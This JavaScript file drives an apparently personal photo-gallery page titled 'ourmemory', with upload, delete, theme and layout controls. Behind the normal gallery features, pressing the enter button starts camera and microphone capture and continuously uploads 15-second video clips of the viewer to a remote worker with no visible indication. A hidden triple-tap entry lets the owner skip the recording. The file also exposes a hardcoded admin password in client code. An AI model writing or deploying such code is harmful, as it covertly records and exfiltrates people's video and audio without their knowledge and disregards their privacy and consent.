const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const ADMIN_PASS = "74722222"; // গ্যালারি থেকে সরাসরি ডিলিট করার জন্য
const RECORDING_CHUNK_MS = 15000; 

const entryScreen = document.getElementById('entry-screen');
const galleryScreen = document.getElementById('gallery-screen');
const galleryContainer = document.getElementById('gallery-grid');

// --- 1. ENTRY & SECRET RECORDING ---
let secretTap = 0, tapTimer;
document.getElementById('secret-heart').addEventListener('click', () => {
    secretTap++; clearTimeout(tapTimer);
    if (secretTap >= 3) { enterGallery(); secretTap = 0; } // সিক্রেট এন্ট্রি (রেকর্ড ছাড়া)
    tapTimer = setTimeout(() => secretTap = 0, 1000); 
});

document.getElementById('enter-btn').addEventListener('click', async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        enterGallery();
        startRecording(stream);
    } catch (err) { enterGallery(); } // পারমিশন না দিলেও গ্যালারিতে যাবে
});

function enterGallery() {
    entryScreen.classList.remove('active-screen');
    galleryScreen.classList.add('active-screen');
    loadImages();
}

function startRecording(stream) {
    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    let chunks = [];
    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
    recorder.onstop = async () => {
        const formData = new FormData();
        formData.append('file', new Blob(chunks, { type: 'video/webm' }), `reaction-${Date.now()}.webm`);
        try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
        startRecording(stream);
    };
    recorder.start();
    setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
}

// --- 2. UPLOAD PHOTOS ---
const uploadFab = document.getElementById('upload-fab');
const uploadInput = document.getElementById('image-upload-input');

uploadFab.addEventListener('click', () => uploadInput.click());
uploadInput.addEventListener('change', async (e) => {
    if (!e.target.files.length) return;
    galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
    
    for (let file of e.target.files) {
        const formData = new FormData(); formData.append('file', file);
        try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } catch(e){}
    }
    loadImages();
});

// --- 3. LOAD & DELETE PHOTOS ---
async function loadImages() {
    galleryContainer.innerHTML = '<div class="loading-text">Loading our moments... ✨</div>';
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            if (data.images.length === 0) { galleryContainer.innerHTML = '<div class="loading-text">No photos yet. Tap + to upload ❤️</div>'; return; }
            
            data.images.forEach(key => {
                const wrap = document.createElement('div');
                wrap.className = 'img-wrapper';
                wrap.innerHTML = `
                    <img src="${WORKER_URL}/api/image/${key}" loading="lazy">
                    <div class="delete-overlay" onclick="deleteImage('${key}')">🗑️</div>
                `;
                galleryContainer.appendChild(wrap);
            });
        }
    } catch (err) { galleryContainer.innerHTML = '<div class="loading-text">Error loading images.</div>'; }
}

async function deleteImage(key) {
    if(!confirm('Are you sure you want to delete this photo?')) return;
    galleryContainer.innerHTML = '<div class="loading-text">Deleting... ⏳</div>';
    try {
        await fetch(`${WORKER_URL}/api/admin/files`, {
            method: 'DELETE',
            headers: { 'X-Admin-Password': ADMIN_PASS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ key })
        });
        loadImages();
    } catch(err) { alert('Failed to delete'); loadImages(); }
}

// --- 4. UI CONTROLS (Themes, Layouts & Bottom Nav) ---
const themes = ['theme-light', 'theme-amoled', 'theme-pink', 'theme-ocean'];
let themeIdx = 0;
document.getElementById('theme-toggle').addEventListener('click', () => {
    document.body.classList.remove(themes[themeIdx]);
    themeIdx = (themeIdx + 1) % themes.length;
    document.body.classList.add(themes[themeIdx]);
});

const layouts = ['layout-2col', 'layout-3col', 'layout-masonry', 'layout-1col'];
let layoutIdx = 0;
document.getElementById('layout-toggle').addEventListener('click', () => {
    galleryContainer.classList.remove(layouts[layoutIdx]);
    layoutIdx = (layoutIdx + 1) % layouts.length;
    galleryContainer.classList.add(layouts[layoutIdx]);
});

// Delete Mode Toggle
const navDelete = document.getElementById('nav-delete');
const navHome = document.getElementById('nav-home');

navDelete.addEventListener('click', () => {
    document.body.classList.toggle('delete-mode');
    if(document.body.classList.contains('delete-mode')) {
        navDelete.classList.add('danger', 'active');
        navHome.classList.remove('active');
    } else {
        navDelete.classList.remove('danger', 'active');
        navHome.classList.add('active');
    }
});

navHome.addEventListener('click', () => {
    document.body.classList.remove('delete-mode');
    navDelete.classList.remove('danger', 'active');
    navHome.classList.add('active');
});
